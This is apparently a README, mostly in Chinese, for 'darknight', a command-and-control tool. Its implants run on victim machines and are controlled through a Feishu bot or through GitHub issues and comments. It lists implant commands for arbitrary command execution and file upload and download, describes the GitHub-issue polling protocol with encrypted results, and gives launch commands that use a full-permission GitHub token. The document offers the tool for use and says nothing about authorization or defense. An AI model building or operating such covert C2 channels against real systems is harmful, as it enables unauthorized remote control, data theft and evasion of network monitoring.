# darknight
**A C2 tool hidden in the darknight**

# 简略架构图

<img src="https://aliyunoss.sakura501.top/img/2024/10/17/20241017111505.png" alt="image-20241017111505799" style="zoom:50%;" />

# 飞书

## 创建bot&配置权限

> https://open.feishu.cn/app/
>
> 后续补充

## 命令大全

>- help : show this help menu
>- start : start the feishu-implant
> - pwd : print working directory
> - whoami : get username
> - cmd \<command\> : execute command
> - upload <remote_file_name> : upload local file to the feishu-implant if your previous message is file
> - download <remote_file_name> : download remote_file of feishu-implant to current local feishu
> - exit : kill the connection with the feishu-implant

## 使用示例

>将飞书当作服务端，群组当作客户端，feishu-implant就是注入端，直接将 implant 放在靶机上面运行即可！
>
>implant 在靶机上运行后，我们需要在飞书群组输入 start 命令启动交互！

启动然后执行命令：

<img src="https://aliyunoss.sakura501.top/img/2024/10/19/20241019014409.png" alt="image-20241019014409647" style="zoom: 25%;" />

下载文件：

<img src="https://aliyunoss.sakura501.top/img/2024/10/19/20241019014516.png" alt="image-20241019014516163" style="zoom:25%;" />

上传文件，**注意需要 upload xxxx 的上一条消息必须是一个文件**：

<img src="https://aliyunoss.sakura501.top/img/2024/10/19/20241019014807.png" alt="image-20241019014807458" style="zoom:25%;" />

# github

## 获取github-token(classic)

进入设置

<img src="https://aliyunoss.sakura501.top/img/2024/10/17/20241017110836.png" alt="image-20241017110828736" style="zoom: 25%;" />

 进入开发者设置

<img src="https://aliyunoss.sakura501.top/img/2024/10/17/20241017110936.png" alt="image-20241017110935958" style="zoom:25%;" />

在token(classic)中选择generate new token

<img src="https://aliyunoss.sakura501.top/img/2024/10/17/20241017111054.png" alt="image-20241017111054689" style="zoom:25%;" />

填写名字、生效日期、以及勾上repo的所有权限，然后创建token即可，注意token只在创建时显示一次，注意保存

<img src="https://aliyunoss.sakura501.top/img/2024/10/17/20241017111243.png" alt="image-20241017111243628" style="zoom:25%;" />

最后的token形式大概是ghp_xxxxxxxx这样的

## 使用教程

> github相当于中间代理服务端，只需要用到api；
>
> teamserver是服务端/客户端，放在attacker上运行；
>
> implant是注入端，放在靶机上面运行；
>
> 运行过程：
>
> - teamserver输入命令，调用github-api发送新的issue标题包含该命令；
>
> - implant会执行轮询获取新的issue的标题，获取到新的命令；
> - implant执行命令获取结果，加密该结果后返回给github，调用github-api向原issue的评论写入该结果；
> - teamserver轮询检测到新的评论写入，获取加密结果进行解密，输出到控制台；

## teamserver和implant启动

```
# 需要在启动攻击机上启动teamserver，靶机上启动implant注入端
teamserver <AccessToken> <Username> <Repository>
implant <AccessToken> <Username> <Repository>
# 例如：
./teamserver ghp_xxxxxxxxx Sakura-501 github-c2-test
./implant ghp_xxxxxxxxx Sakura-501 github-c2-test
```

## 命令大全

- help：帮助手册

<img src="https://aliyunoss.sakura501.top/img/2024/10/17/20241017112501.png" alt="image-20241017112501343" style="zoom:50%;" />

- pwd：当前工作目录；
- whoami：当前用户名；
- cmd \<command\>：执行command命令；
- upload <local_file_path> <remote_file_name>：teamserver先上传本地文件local_file_path到github，并命名为remote_file_name，然后下载该remote_file_name到implant当前的工作目录；
- download <remote_file_name> <local_file_path>：implant先上传本地文件local_file_path到github，并命名为remote_file_name，然后下载该remote_file_name到teamserver当前的工作目录；
- exit：切断与implant的连接，终止implant进程运行；